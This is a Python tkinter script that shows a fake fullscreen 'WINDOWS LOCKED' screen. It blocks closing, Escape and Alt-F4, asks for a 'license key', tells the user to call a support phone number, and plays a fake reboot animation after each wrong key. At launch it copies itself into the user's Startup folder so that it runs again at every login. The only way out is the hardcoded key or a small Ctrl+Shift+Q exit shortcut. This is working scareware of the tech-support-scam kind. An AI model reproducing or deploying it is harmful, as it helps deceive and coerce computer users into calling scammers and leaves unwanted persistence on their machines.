import tkinter as tk
import random, threading, time, sys, os, shutil

try:
    import winsound
    HAVE_WINSOUND = True
except Exception:
    HAVE_WINSOUND = False

# ------------ CONFIG ------------
EXPECTED_KEY = "YTMG3-N6DMC-DKB77-7M9GH-8HVX7"   
SHOW_DEBUG = False
SUPPORT_PHONE = "1-800-123-4567"
DEFAULT_FONT_FAMILY = "Segoe UI"
# ------------ END CONFIG ------------

# Add script to Startup folder
def add_to_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_path = os.path.abspath(sys.argv[0])
    dest_path = os.path.join(startup_dir, os.path.basename(script_path))
    if not os.path.exists(dest_path):
        try:
            shutil.copy(script_path, dest_path)
            print(f"[+] Added to startup: {dest_path}")
        except Exception as e:
            print(f"[-] Failed to add to startup: {e}")

# Remove script from Startup folder
def remove_from_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_name = os.path.basename(sys.argv[0])
    startup_path = os.path.join(startup_dir, script_name)
    if os.path.exists(startup_path):
        try:
            os.remove(startup_path)
            print(f"[+] Removed from startup: {startup_path}")
        except Exception as e:
            print(f"[-] Failed to remove from startup: {e}")

# Call startup function
add_to_startup()

def sample_mask():
    return "XXXX-XXXXX-XXXXX-XXXXX"

def play_alert_sound():
    if HAVE_WINSOUND:
        try:
            winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC)
        except Exception:
            pass

def create_warning_icon(parent, size=64, color="#E1B000", border="#C18800"):
    c = tk.Canvas(parent, width=size, height=size, bg="white", highlightthickness=0)
    pad = 6
    pts = (size/2, pad, size-pad, size-pad, pad, size-pad)
    c.create_polygon(pts, fill=color, outline=border, width=2)
    c.create_rectangle(size*0.48, size*0.25, size*0.52, size*0.62, fill="black", outline="")
    c.create_oval(size*0.47, size*0.72, size*0.53, size*0.78, fill="black", outline="")
    return c

def show_fake_reboot_overlay():
    overlay = tk.Toplevel(root)
    overlay.attributes("-fullscreen", True)
    overlay.configure(bg="black")
    overlay.attributes("-topmost", True)
    overlay.focus_force()

    lbl = tk.Label(overlay, text="Rebooting...", font=(DEFAULT_FONT_FAMILY, 30), fg="white", bg="black")
    lbl.pack(expand=True)
    prog = tk.Label(overlay, text="", font=(DEFAULT_FONT_FAMILY, 20), fg="white", bg="black")
    prog.pack(pady=(0,150))

    def animate():
        for i in range(0, 101, 5):
            prog.config(text=f"{i}%")
            time.sleep(0.08)
        time.sleep(0.35)
        try:
            overlay.destroy()
        except:
            pass

    threading.Thread(target=animate, daemon=True).start()

def try_unlock():
    val = entry.get().strip().upper()
    if val == EXPECTED_KEY.upper():
        status_label.config(text="Windows unlocked — Thank you!", fg="#0A7F1A")
        remove_from_startup()  # Remove from startup when unlocked
        root.after(900, root.destroy)
    else:
        status_label.config(text="Invalid license key. System remains locked.", fg="#B30000")
        entry.delete(0, tk.END)
        play_alert_sound()
        root.after(700, show_fake_reboot_overlay)

def disable_close():
    pass

def emergency_exit(event=None):
    try:
        root.destroy()
    except:
        try:
            sys.exit(0)
        except:
            pass

def ignore_event(event=None):
    return "break"

# GUI Setup
root = tk.Tk()
root.title("WINDOWS LOCKED")
root.configure(bg="#0A58A5")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", disable_close)

dialog_w = 780
dialog_h = 420
frame = tk.Frame(root, bg="white", bd=2, relief="ridge")
frame.place(relx=0.5, rely=0.5, anchor="center", width=dialog_w, height=dialog_h)

title_font = (DEFAULT_FONT_FAMILY, 20, "bold")
text_font = (DEFAULT_FONT_FAMILY, 12)
big_font = (DEFAULT_FONT_FAMILY, 14, "bold")
small_font = (DEFAULT_FONT_FAMILY, 9)

top = tk.Frame(frame, bg="white")
top.pack(pady=(12,6), anchor="w", fill="x", padx=12)

icon = create_warning_icon(top, size=56)
icon.pack(side="left", padx=(4,12))
title = tk.Label(top, text="WINDOWS LOCKED", bg="white", fg="black", font=title_font)
title.pack(side="left", anchor="s")

msg_text = ("This copy of Windows is locked.\n"
            "You must enter a valid license key to unlock it.")
msg = tk.Label(frame, text=msg_text, bg="white", fg="black", font=text_font, justify="left")
msg.pack(padx=18, anchor="w")

lic_frame = tk.Frame(frame, bg="white")
lic_frame.pack(pady=(8,6))
lbl_key = tk.Label(lic_frame, text="LICENSE KEY:", bg="white", font=big_font)
lbl_key.pack(side="left", padx=(6,10))
lbl_mask = tk.Label(lic_frame, text=sample_mask(), bg="white", fg="#333", font=text_font)
lbl_mask.pack(side="left")

entry = tk.Entry(frame, font=big_font, justify="center")
entry.pack(pady=(12,4), ipadx=6, ipady=6)

btn_frame = tk.Frame(frame, bg="white")
btn_frame.pack(pady=(6,8))

ok_btn = tk.Button(btn_frame, text="OK", font=big_font, width=12, command=try_unlock)
ok_btn.pack(side="left", padx=8)

support = tk.Label(frame, text=f"If you do not have a license key, please call support:\n{SUPPORT_PHONE}",
                   bg="white", fg="black", font=text_font, justify="left")
support.pack(pady=(6,0), anchor="w", padx=12)

status_label = tk.Label(frame, text="", bg="white", fg="red", font=text_font)
status_label.pack(pady=(6,6))

if SHOW_DEBUG:
    debug_label = tk.Label(frame, text=f"(DEBUG: correct key = {EXPECTED_KEY})", bg="white", fg="#666", font=small_font)
    debug_label.pack(side="bottom", pady=(6,8))

footer = tk.Label(root, text="(Emergency exit: Ctrl+Shift+Q)", bg="#0A58A5", fg="#ffffff", font=small_font)
footer.place(relx=0.99, rely=0.99, anchor="se", x=-6, y=-6)

for seq in ("<Escape>", "<Alt-F4>"):
    root.bind_all(seq, ignore_event)

root.bind_all("<Control-Shift-KeyPress-Q>", lambda e: emergency_exit())

entry.focus_set()

try:
    root.mainloop()
except Exception:
    try:
        root.destroy()
    except:
        pass